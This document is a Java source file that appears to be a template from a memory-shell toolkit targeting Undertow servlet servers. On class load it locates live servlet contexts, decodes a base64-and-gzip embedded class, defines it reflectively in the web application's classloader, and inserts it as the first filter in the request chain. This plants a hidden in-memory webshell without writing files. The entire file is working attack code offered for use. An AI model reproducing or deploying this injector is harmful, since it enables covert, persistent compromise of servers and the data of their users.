package com.reajason.javaweb.memshell.injector.undertow;

import javax.servlet.DispatcherType;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;
import java.util.zip.GZIPInputStream;


/**
 * @author ReaJason
 */
public class UndertowFilterInjector {

    static {
        new UndertowFilterInjector();
    }

    public UndertowFilterInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getShell(context);
                inject(context, filter);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public List<Object> getContext() {
        List<Object> contexts = new ArrayList<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            try {
                Class<?> clazz = thread.getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext");
                Object requestContext = invokeMethod(clazz, "current", null, null);
                Object servletContext = invokeMethod(requestContext, "getCurrentServletContext", null, null);
                if (servletContext != null) {
                    contexts.add(servletContext);
                }
            } catch (Exception ignored) {
            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            Object deploymentInfo = getFieldValue(context, "deploymentInfo");
            return ((ClassLoader) invokeMethod(deploymentInfo, "getClassLoader", null, null));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        try {
            return classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            return clazz.newInstance();
        }
    }

    public void inject(Object context, Object filter) throws Exception {
        if (isInjected(context)) {
            System.out.println("filter already injected");
            return;
        }
        Class<?> filterInfoClass = context.getClass().getClassLoader().loadClass("io.undertow.servlet.api.FilterInfo");
        Object deploymentInfo = getFieldValue(context, "deploymentInfo");
        Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class).newInstance(getClassName(), filter.getClass());
        invokeMethod(deploymentInfo, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
        Object deploymentImpl = getFieldValue(context, "deployment");
        Object managedFilters = invokeMethod(deploymentImpl, "getFilters", null, null);
        invokeMethod(managedFilters, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
        invokeMethod(deploymentInfo, "insertFilterUrlMapping", new Class[]{int.class, String.class, String.class, DispatcherType.class}, new Object[]{0, getClassName(), getUrlPattern(), DispatcherType.REQUEST});
        System.out.println("filter inject success");
    }

    @SuppressWarnings("unchecked")
    public boolean isInjected(Object context) throws Exception {
        Map<String, Object> filters = (HashMap<String, Object>) getFieldValue(getFieldValue(context, "deploymentInfo"), "filters");
        if (filters != null) {
            for (Map.Entry<String, Object> filter : filters.entrySet()) {
                Class<?> filterClass = (Class<?>) getFieldValue(filter.getValue(), "filterClass");
                if (filterClass != null) {
                    if (filterClass.getName().equals(getClassName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(name);
    }


    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        try {
            Field field = getField(obj, name);
            field.setAccessible(true);
            return field.get(obj);
        } catch (NoSuchFieldException ignored) {
        }
        return null;
    }


    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }

            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }
}
